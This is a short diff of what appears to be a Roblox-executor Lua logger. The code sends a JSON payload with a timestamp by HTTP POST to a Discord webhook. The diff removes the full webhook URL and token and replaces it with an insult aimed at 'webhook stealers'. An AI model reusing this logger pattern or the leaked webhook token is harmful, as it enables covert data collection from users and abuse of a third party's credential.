@@ -17,7 +17,7 @@ local lobgerz = {
             ['timestamp'] = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec),
         }
         (syn and syn.request or http_request) {
-            Url = 'https://discord.com/api/webhooks/970089962643017728/OSTQBKzdtjWvQCLS3-hbHai7SbE3cFG9fp7K37jxOguUZ9hL4itcF4H9sYUyY3fYXtNA';
+            Url = 'fuck u webhook stealer';
             Method = 'POST';
             Headers = {
                 ['Content-Type'] = 'application/json';
